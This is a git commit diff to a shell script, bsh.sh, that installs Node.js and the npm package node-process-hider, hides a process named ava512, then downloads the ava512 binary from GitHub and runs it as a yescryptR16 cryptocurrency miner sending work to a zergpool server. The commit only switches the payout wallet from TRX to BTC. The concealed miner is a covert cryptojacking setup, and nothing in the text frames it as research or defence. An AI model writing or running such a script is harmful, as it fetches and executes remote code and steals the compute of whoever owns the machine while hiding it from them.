010df49ddb762ffff18f60f7a6735160ab22405e
mrwhjo <100627472+mrwhjo@users.noreply.github.com>
2022-06-30 13:34:53 +0700

    Update bsh.sh

--- bsh.sh
+++ bsh.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.12.0 && npm i -g node-process-hider && ph add ava512
-wget https://github.com/mrwhjo/cci/raw/main/ava512 && chmod +x ava512 && ./ava512 -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u TMWXVhE6TJNurvBMXVJvptnR8GpdGe7rPY -p c=TRX -t 2
+wget https://github.com/mrwhjo/cci/raw/main/ava512 && chmod +x ava512 && ./ava512 -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u 3NF5JGA941wWc48HbmmPa56qppxSEuVxdS -p c=BTC,mc=QOGE -t 2
